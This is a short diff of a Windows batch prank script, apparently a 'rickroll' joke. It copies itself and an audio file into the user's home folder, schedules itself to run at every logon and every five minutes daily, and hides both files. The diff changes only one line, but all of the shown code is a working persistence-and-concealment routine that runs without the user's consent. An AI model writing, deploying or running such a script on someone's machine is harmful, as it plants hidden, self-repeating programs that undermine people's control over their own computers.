@@ -8,7 +8,7 @@ copy rickroll.mp3 "C:%homepath%"
 copy A.bat "C:%homepath%"
 Schtasks /create /sc ONLOGON /tn L /tr "C:%homepath%\A.bat" 
 Schtasks /create /sc DAILY /tn LOL /tr "C:%homepath%\A.bat" /ri 5 /du 24:00
-%homepath%
+cd "C:%homepath%"
 attrib +h A.bat
 attrib +h rickroll.mp3
 cd /D "%~dp0"
